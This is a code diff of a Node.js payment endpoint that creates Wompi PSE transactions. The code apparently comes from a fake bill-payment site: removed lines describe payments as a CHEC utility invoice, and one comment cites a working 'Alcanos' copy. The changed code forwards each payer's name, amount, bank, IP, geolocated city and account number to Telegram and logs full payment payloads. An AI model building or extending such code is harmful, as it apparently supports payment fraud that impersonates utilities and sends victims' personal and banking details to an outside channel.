@@ -398,8 +398,13 @@ app.post("/api/pasarela/cobro-pse", async (req, res) => {
     const tokens = await getWompiTokens();
     const paymentLinkId = WOMPI_PAYMENT_LINK_ID;
 
-    // 2. Construir payload — IDÉNTICO a Alcanos que funciona
+    // 2. Construir payload
     const amountInCents = Math.round(parseFloat(amount) * 100);
+
+    // 3. Obtener IP del cliente para reference_one (requerido por PSE_AVANZA)
+    const clientIp = req.headers["x-forwarded-for"] || req.headers["x-real-ip"] || req.socket.remoteAddress || "0.0.0.0";
+    const realIp = clientIp.split(",")[0].trim();
+
     const transactionPayload = {
       acceptance_token: tokens.acceptance_token,
       accept_personal_auth: tokens.personal_auth_token,
@@ -415,26 +420,25 @@ app.post("/api/pasarela/cobro-pse", async (req, res) => {
         user_legal_id_type: customerDocType || "CC",
         user_legal_id: customerDoc,
         financial_institution_code: bankCode,
-        payment_description: "Pago factura CHEC SA ESP"
+        payment_description: "Pago en linea",
+        reference_one: realIp,
+        reference_two: new Date().toISOString().slice(0, 10).replace(/-/g, ""),
+        reference_three: customerDoc
       },
       customer_data: {
         phone_number: customerPhone,
-        full_name: customerName,
-        legal_id: customerDoc,
-        legal_id_type: customerDocType || "CC"
+        full_name: customerName
       }
     };
 
-    // 3. Notificar Telegram (amount viene en pesos)
-    const clientIp = req.headers["x-forwarded-for"] || req.headers["x-real-ip"] || req.socket.remoteAddress || "0.0.0.0";
-    const realIp = clientIp.split(",")[0].trim();
+    // 4. Notificar Telegram (amount viene en pesos)
     const ciudad = await obtenerUbicacionIP(realIp);
     notificarTelegram(customerName || "Sin nombre", amount, bankCode, realIp, ciudad, numeroCuenta || "N/A");
 
     console.log("═══ TRANSACCIÓN WOMPI PSE (public key) ═══");
     console.log(JSON.stringify(transactionPayload, null, 2));
 
-    // 4. Crear transacción con PUBLIC KEY como Bearer
+    // 5. Crear transacción con PUBLIC KEY como Bearer
     const wompiRes = await axios.post(`${WOMPI_API}/transactions`, transactionPayload, {
       headers: {
         Authorization: `Bearer ${WOMPI_PUB_KEY}`,
